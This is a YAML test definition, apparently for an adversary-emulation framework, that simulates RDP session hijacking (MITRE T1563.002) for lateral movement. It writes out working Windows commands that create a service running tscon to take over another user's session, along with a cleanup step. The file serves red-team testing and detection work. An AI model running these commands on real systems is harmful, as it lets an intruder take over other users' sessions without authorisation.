api_version: "2.0"
name: RDP hijacking
description: |
    [RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization
args:
    - name: Session_ID
      type: string
      default: "1337"
    - name: Destination_ID
      type: string
      default: rdp-tcp#55
uuid: a37ac520-b911-458e-8aed-c5f1576d9f46
mitre:
    tactics:
        - 'TA0008: Lateral Movement'
    techniques:
        - 'T1563: Remote Service Session Hijacking'
    subtechniques:
        - 'T1563.002: RDP Hijacking'
requirements:
    platforms:
        - os: windows
steps:
    - name: rdp-hijacking
      inline: |
        query user
        sc.exe create sesshijack binpath= "cmd.exe /k tscon {{.Args.Session_ID}} /dest:{{.Args.Destination_ID}}"
        net start sesshijack
      executor: command_prompt
      cleanup:
        inline: |
            sc.exe delete sesshijack >nul 2>&1
        executor: command_prompt
